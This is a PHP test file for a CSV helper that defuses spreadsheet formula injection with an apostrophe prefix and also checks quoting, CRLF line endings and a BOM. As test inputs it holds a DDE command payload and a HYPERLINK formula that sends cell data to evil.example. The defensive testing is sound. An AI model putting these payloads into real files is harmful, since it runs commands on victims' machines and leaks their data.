<?php

declare(strict_types=1);

use App\Support\Csv;

it('neutralises every character a spreadsheet reads as a formula', function () {
    // The four classic ones, plus tab and CR — several readers strip leading
    // whitespace before deciding, so "\t=cmd" is a formula again.
    expect(Csv::cell('=1+1'))->toBe('"\'=1+1"')
        ->and(Csv::cell('+1'))->toBe('"\'+1"')
        ->and(Csv::cell('-1'))->toBe('"\'-1"')
        ->and(Csv::cell('@SUM(A1)'))->toBe('"\'@SUM(A1)"')
        ->and(Csv::cell("\t=cmd|'/c calc'!A0"))->toBe('"\'' . "\t" . '=cmd|\'/c calc\'!A0"')
        ->and(Csv::cell("\r=1+1"))->toBe('"\'' . "\r" . '=1+1"');
});

it('guards the real-world payload, not just the first character', function () {
    $attack = '=HYPERLINK("https://evil.example/?x="&A1,"Click for a refund")';

    expect(Csv::cell($attack))->toStartWith('"\'=HYPERLINK');
});

it('leaves ordinary text alone', function () {
    expect(Csv::cell('Heartleaf 77% Soothing Toner'))->toBe('"Heartleaf 77% Soothing Toner"')
        ->and(Csv::cell('KBB-0001'))->toBe('"KBB-0001"')
        ->and(Csv::cell(''))->toBe('""')
        ->and(Csv::cell(null))->toBe('""')
        ->and(Csv::cell(12))->toBe('"12"');
});

it('still quotes properly, since quoting alone would not have been enough', function () {
    // A quoted formula is still a formula once the CSV parser consumes the
    // quotes — the apostrophe is what does the work, the quoting is only so
    // commas and newlines survive.
    expect(Csv::cell('He said "hi", then left'))->toBe('"He said ""hi"", then left"')
        ->and(Csv::cell("two\nlines"))->toBe("\"two\nlines\"");
});

it('builds a CRLF document with a BOM so Excel reads Arabic correctly', function () {
    $doc = Csv::document([['a', 'b'], ['c', 'd']]);

    expect($doc)->toStartWith("\xEF\xBB\xBF")
        ->and($doc)->toBe("\xEF\xBB\xBF\"a\",\"b\"\r\n\"c\",\"d\"\r\n");

    expect(Csv::document([['a']], bom: false))->toBe("\"a\"\r\n");
});
